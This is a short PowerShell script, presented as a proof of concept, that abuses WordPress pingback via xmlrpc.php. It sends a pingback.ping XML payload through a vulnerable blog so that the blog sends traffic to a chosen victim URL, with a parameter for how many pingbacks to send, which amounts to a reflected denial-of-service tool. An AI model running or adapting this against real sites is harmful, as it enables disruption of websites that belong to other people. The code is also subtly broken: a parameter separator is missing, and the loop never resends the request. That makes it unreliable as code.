###########################################################################
#
# NAME: PingBack_DDoS.ps1
#
# AUTHOR: RichRoc
#
# COMMENT: Simple Proof of concept powershell script for testing the exploitation of wordpress pingback functionality.
#
# VERSION HISTORY:
# 0.1 8/15/2014 - Initial release
#
###########################################################################
#Parameters# 
[CmdletBinding()] 
Param( 
	[Parameter(Mandatory=$True,Position=1,HelpMessage="URL of the site that will recieve the pingback")] 
	[string]$Victim_URI 
	[Parameter(Mandatory=$True,Position=2,HelpMessage="URL of the blog posting on the vulnerable site. ex:www.site.com/?p=100")] 
	[string]$Blog_URI, 
	[Parameter(Mandatory=$True,Position=3,HelpMessage="URI to the xmlrpc of the vulnerable site. ex:www.site.com/xmlrpc.php")] 
	[string]$xmlrpc_URI, 
	[Parameter(Mandatory=$False,Position=4,HelpMessage="Number of pingbacks you want to sent to the victim site.")] 
	[int]$iterations
) 
$i = 0

$Payload = "<?xml version=`"1.0`" encoding=`"iso-8859-1`"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>'$Victim_URI'</string></value></param><param><value><string>'$Blog_URI'</string></value></param></params></methodCall>"
$request = Invoke-WebRequest -Uri $xmlrpc_URI -Method Post -Body $Payload

While ($i -lt $iterations)
{
$request
$i ++
}
